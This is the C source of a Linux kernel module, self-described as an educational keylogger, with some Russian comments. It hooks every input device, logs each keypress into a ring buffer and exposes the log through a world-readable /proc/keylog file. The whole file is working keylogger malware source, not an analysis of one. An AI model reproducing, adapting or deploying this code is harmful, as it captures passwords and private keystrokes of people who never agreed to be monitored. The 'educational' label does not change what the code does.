#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/spinlock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Educational Keylogger Kernel Module");

/* ------------------- CONFIG ---------------------- */

#define BUF_SIZE 4096        // размер кольцевого буфера
static char *log_buf;        // буфер логов
static int buf_head = 0;     // указатель записи
static int buf_tail = 0;     // указатель чтения
static spinlock_t buf_lock;  // защита буфера

static struct proc_dir_entry *proc_entry;

/* ------------------- КОНВЕРТАЦИЯ KEYCODE ---------------------- */

static const char *keymap[] = {
    "\0", "_ESC_", "1", "2", "3", "4", "5", "6",
    "7", "8", "9", "0", "-", "=", "_BACKSPACE_",
    "_TAB_", "q", "w", "e", "r", "t", "y", "u",
    "i", "o", "p", "[", "]", "\n", "_LCTRL_",
    "a", "s", "d", "f", "g", "h", "j", "k",
    "l", ";", "'", "`", "_LSHIFT_", "\\", "z",
    "x", "c", "v", "b", "n", "m", ",", ".",
    "/", "_RSHIFT_", "*", "_LALT_", " ", "_CAPS_",
};

/* ------------------- КОЛЬЦЕВОЙ БУФЕР ---------------------- */

static void buf_write_char(char c) {
    unsigned long flags;
    spin_lock_irqsave(&buf_lock, flags);

    log_buf[buf_head] = c;
    buf_head = (buf_head + 1) % BUF_SIZE;

    if (buf_head == buf_tail)  // переполнение → сдвигаем хвост
        buf_tail = (buf_tail + 1) % BUF_SIZE;

    spin_unlock_irqrestore(&buf_lock, flags);
}

static void buf_write_string(const char *s) {
    while (*s) {
        buf_write_char(*s++);
    }
}

/* ------------------- INPUT HANDLER ---------------------- */

static void handle_key(struct input_handle *handle,
                       unsigned int type, unsigned int code, int value)
{
    if (type != EV_KEY) return;
    if (value != 1) return; // только нажатие

    if (code < ARRAY_SIZE(keymap)) {
        buf_write_string(keymap[code]);
        buf_write_char('\n');
    }
}

static int my_input_connect(struct input_handler *handler,
                            struct input_dev *dev,
                            const struct input_device_id *id)
{
    struct input_handle *handle;
    int err;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "my_keylogger";

    err = input_register_handle(handle);
    if (err) {
        kfree(handle);
        return err;
    }

    err = input_open_device(handle);
    if (err) {
        input_unregister_handle(handle);
        kfree(handle);
        return err;
    }

    printk(KERN_INFO "keylogger: connected to %s\n", dev->name);
    return 0;
}

static void my_input_disconnect(struct input_handle *handle)
{
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id my_ids[] = {
    { .driver_info = 1 }, /* Match all devices */
    { }
};

MODULE_DEVICE_TABLE(input, my_ids);

static struct input_handler keylogger_handler = {
    .event      = handle_key,
    .connect    = my_input_connect,
    .disconnect = my_input_disconnect,
    .name       = "my_keylogger_handler",
    .id_table   = my_ids,
};

/* ------------------- /proc интерфейс ---------------------- */

static ssize_t proc_read(struct file *file, char __user *ubuf,
                         size_t count, loff_t *ppos)
{
    int copied = 0;
    unsigned long flags;

    if (*ppos > 0)
        return 0;

    spin_lock_irqsave(&buf_lock, flags);

    while (buf_tail != buf_head && copied < count) {
        if (put_user(log_buf[buf_tail], ubuf + copied)) {
            spin_unlock_irqrestore(&buf_lock, flags);
            return -EFAULT;
        }
        buf_tail = (buf_tail + 1) % BUF_SIZE;
        copied++;
    }

    spin_unlock_irqrestore(&buf_lock, flags);
    *ppos = copied;

    return copied;
}

static const struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read  = proc_read,
};

/* ------------------- INIT / EXIT ---------------------- */

static int __init keylogger_init(void)
{
    log_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
    if (!log_buf) return -ENOMEM;

    spin_lock_init(&buf_lock);

    proc_entry = proc_create("keylog", 0444, NULL, &proc_fops);
    if (!proc_entry) {
        kfree(log_buf);
        return -ENOMEM;
    }

    input_register_handler(&keylogger_handler);

    printk(KERN_INFO "keylogger loaded\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    proc_remove(proc_entry);
    input_unregister_handler(&keylogger_handler);
    kfree(log_buf);
    printk(KERN_INFO "keylogger unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);